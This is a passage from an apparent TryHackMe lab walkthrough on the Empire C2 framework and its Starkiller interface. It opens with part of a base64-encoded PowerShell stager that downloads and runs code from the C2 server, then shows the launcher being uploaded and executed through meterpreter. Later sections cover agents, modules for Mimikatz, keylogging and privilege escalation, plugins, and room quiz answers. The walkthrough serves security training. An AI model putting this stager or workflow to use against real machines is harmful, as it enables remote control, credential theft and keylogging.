UAUgBTAC4AQQBkAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAFoAaQBxAE4AUQBIAD0AUAB6AGoAVgBxAG8AMAB2AHMAZABtAGgAWAArAFEATABGAEMARQBRAHoAVwBYAFgAVABUADQAPQAiACkAOwAkAGQAYQB0AEEAPQAkADUANgA2AC4ARABPAFcAbgBsAE8AQQBEAEQAYQB0AEEAKAAkAHMAZQByACsAJAB0ACkAOwAkAEkAdgA9ACQAZABhAHQAYQBbADAALgAuADMAXQA7ACQARABBAHQAQQA9ACQARABBAFQAQQBbADQALgAuACQARABBAHQAYQAuAEwAZQBOAGcAVABIAF0AOwAtAGoAbwBpAG4AWwBDAEgAQQBSAFsAXQBdACgAJgAgACQAUgAgACQAZABBAFQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA 
```

Then we upload it to the target machine via our meterpreter session

```bash
meterpreter > upload /mnt/hgfs/Wargames/TryHackMe/Walkthroughs/Easy/Empire/launcher.bat C:\\launcher.bat
[*] Uploading  : /mnt/hgfs/Wargames/TryHackMe/Walkthroughs/Easy/Empire/launcher.bat -> C:\launcher.bat
[*] Uploaded 3.95 KiB of 3.95 KiB (100.0%): /mnt/hgfs/Wargames/TryHackMe/Walkthroughs/Easy/Empire/launcher.bat -> C:\launcher.bat
[*] Completed  : /mnt/hgfs/Wargames/TryHackMe/Walkthroughs/Easy/Empire/launcher.bat -> C:\launcher.bat
meterpreter > ls
Listing: C:\
============

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
040777/rwxrwxrwx  0      dir   2018-12-13 04:13:36 +0100  $Recycle.Bin
040777/rwxrwxrwx  0      dir   2009-07-14 07:08:56 +0200  Documents and Settings
040777/rwxrwxrwx  0      dir   2009-07-14 05:20:08 +0200  PerfLogs
040555/r-xr-xr-x  4096   dir   2019-03-17 23:22:01 +0100  Program Files
040555/r-xr-xr-x  4096   dir   2019-03-17 23:28:38 +0100  Program Files (x86)
040777/rwxrwxrwx  4096   dir   2019-03-17 23:35:57 +0100  ProgramData
040777/rwxrwxrwx  0      dir   2018-12-13 04:13:22 +0100  Recovery
040777/rwxrwxrwx  4096   dir   2026-02-07 10:00:16 +0100  System Volume Information
040555/r-xr-xr-x  4096   dir   2018-12-13 04:13:28 +0100  Users
040777/rwxrwxrwx  16384  dir   2019-03-17 23:36:30 +0100  Windows
040777/rwxrwxrwx  0      dir   2026-02-07 09:24:33 +0100  badr
100666/rw-rw-rw-  24     fil   2019-03-17 20:27:21 +0100  flag1.txt
000000/---------  0      fif   1970-01-01 01:00:00 +0100  hiberfil.sys
100777/rwxrwxrwx  4049   fil   2026-02-07 11:00:03 +0100  launcher.bat
000000/---------  0      fif   1970-01-01 01:00:00 +0100  pagefile.sys

meterpreter > 
```

and finally execute it.

```bash
meterpreter > execute -f launcher.bat
Process 2412 created.
meterpreter > 
```

Checking the agents we now have

![Starkiller 6](Images/Starkiller_6.png)

### Task 7: Agents

Agents Overview

Agents are used within Starkiller similar to how you would interact with a normal shell or terminal. You can run shell commands as well as modules that come pre-packaged with Empire. Different to a normal shell, with any C2 server once you have an agent connected back to the C2 server you can use any modules and not trip AV or other detections because they are run remotely. All agents have the same functionality and modules available the stager and listener only determine how the agent is sent to the device and how it connects back.

Agents are color-coded and use icons to help distinguish Agent status. Below is an outline of the color and icon scheme

- Red - User is no longer responding
- Black - User is responding normally
- User Icon - Normal user account
- User Icon w/ Gear - System user account

#### Using Agents

Below you can see the basic layout of the Agent interaction menu and what capabilities an agent on a device has.

![Empire 19](Images/Empire_19.png)

The main functions of the interaction menu you will use are again the shell commands and modules, but the menu has other features like renaming the agent, kill agent, and the ability to adjust specifics configurations of the agent from the VIEW tab this is out of scope for this room but we encourage you to take a look and explore more of this menu.

Even though this is a Windows box Empire allows the ability to run any shell commands on it such as ls, whoami, ifconfig, etc. which can be useful if you are not comfortable with the normal Windows command line syntax.

All shell commands and modules when they are run are referred to as tasks in Empire as the agent is sent out to the device to perform the task then comes back with the output.

Underneath the Execute Module section is where the output for both shell commands and modules will appear.

![Empire 20](Images/Empire_20.png)

The output will show what username on the C2 server executed the task then the output of the task. Showing the Empire username before the task can be very helpful as Empire has the capability to use multiple clients and users connected to the same server to interact with one agent.

---------------------------------------------------------------------------

### Task 8: Modules

#### Module Overview

Modules are used in Empire as a way of packaging tools and exploits to be easily used with agents. These modules can be useful for easily compiling exploits, using tools, and bypassing anti-virus. Empire has a collection of modules as well as the ability to add plugins that act as modules which we will cover further in the next task.

We can take a look at a few useful ones for enumeration and privilege escalation outlined below:

- Seatbelt
- Mimikatz
- WinPEAS
- etc.

Empire sorts the modules by the language used: PowerShell, python, external, and exfiltration as well as categories for modules you can find the categories below.

- code execution
- collection
- credentials
- exfiltration
- exploitation
- lateral movement
- management
- persistence
- privesc
- recon
- situational awareness
- trollsploit

Empire categorizes modules based on MITRE ATT&CK and provides the techniques used for each module in the ATT&CK naming convention such as [T1552](https://attack.mitre.org/techniques/T1552/004/). For more information about ATT&CK check out the [MITRE page](https://attack.mitre.org/) or the [Tryhackme MITRE room](https://tryhackme.com/room/mitre).

![Empire 21](Images/Empire_21.png)

#### Using Modules

Using modules is pretty straightforward, you can open a user interaction menu and find the module you want to use. Once you have the module you want to use some require that you enter some details like a command to run, listener, etc. and others you can just run straight out of the box

Below you can see us running the Seatbelt module, for the module, it does not require any configuration you simply select the module then run it. If you want more control over modules you can select the Optional Fields drop-down and have other options you can configure for example specifying a command in Seatbelt to run.

Below you can see the task to run Seatbelt being assigned then the output of the module being printed to the console window.

![Empire 22](Images/Empire_22.png)

Because all modules are run remotely from a task and agent this means that we do not have to worry about Anti-Virus or other possible detections.

We can take a look at other modules to see some more of the capabilities of Empire modules. Below you can see the output for WinPEAS, a script originally from the Privilege Escalation Awesome Scripts Suite then brought over to Empire.

![Empire 23](Images/Empire_23.png)

The screenshot above only shows basic system information from the WinPEAS output but the output from the module can give you other very important information regarding privilege escalation vectors.

---------------------------------------------------------------------------

#### What module allows you to use any mimikatz command?

![Starkiller 7](Images/Starkiller_7.png)

Answer: `powershell/credentials/mimikatz/command`

#### What MITRE ATT&CK technique is associated with powershell/trollsploit/voicetroll?

![Starkiller 8](Images/Starkiller_8.png)

Answer: `T1491`

#### What module implants a keylogger on the device?

![Starkiller 9](Images/Starkiller_9.png)

Answer: `powershell/collection/keylogger`

#### What MITRE ATT&CK technique is associated with the module above?

![Starkiller 10](Images/Starkiller_10.png)

Answer: `T1056`

### Task 9: Plugins

#### Plugins Overview

Plugins are an extension of the base set of modules that Empire comes with.  You can easily download and use community-made plugins to extend the use of Empire.

To use a plugin, transfer a plugin.py file to the /plugins directory of Empire. As an example of how to use plugins, we will be using the socks server plugin made by BC-Security, you can download it [here](https://github.com/BC-SECURITY/SocksProxyServer-Plugin).

#### Using Plugins

Transfer or clone the plugin that you want to use into the plugins directory for Empire.

![Empire 24](Images/Empire_24.png)

After Empire version 3.4.0, Empire automatically loads plugins into the server. If the plugin is not already running you can use the plugin command to load the plugin for use.

Syntax: `plugin <plugin name>`

![Empire 25](Images/Empire_25.png)

You can run plugins using the start and stop commands. Depending on the plugin the flags / parameters can change for each.

Syntax: `start <plugin name>`

Syntax: `stop <plugin name>`

![Empire 26](Images/Empire_26.png)

Usage of plugins works differently for each plugin. The socks server plugin uses a start and stop command along with the name of the plugin to start up a new proxy server similar to putting a proxy directly onto the host, but plugins are directly contained within Empire.

---------------------------------------------------------------------------

### Task 10: Conclusion

Want to learn more? The BC-Security blog can be a great place to start with learning more advanced techniques with Empire. BC-Security also does occasional webcasts or online courses that can go more in-depth. For more information check out the [BC-Security website](https://www.bc-security.org/).

If using Empire you can use it in place of Netcat or other reverse shells when completing rooms.

If you want to continue working on your exploitation techniques with Empire on Tryhackme, check out [DLL HIJACKING](https://tryhackme.com/room/dllhijacking).

![dll icon](Images/dll_icon.png)

For additional information, please see the references below.

## References

- [Docker (software) - Wikipedia](https://en.wikipedia.org/wiki/Docker_(software))
- [Empire - Docker Hub](https://hub.docker.com/r/bcsecurity/empire/tags)
- [Empire - GitHub](https://github.com/BC-SECURITY/Empire)
- [Empire - Kali Tools](https://www.kali.org/tools/powershell-empire/)
- [Empire - Wiki](https://bc-security.gitbook.io/empire-wiki/)
- [PowerShell - Wikipedia](https://en.wikipedia.org/wiki/PowerShell)
- [Starkiller - GitHub](https://github.com/BC-SECURITY/Starkiller)
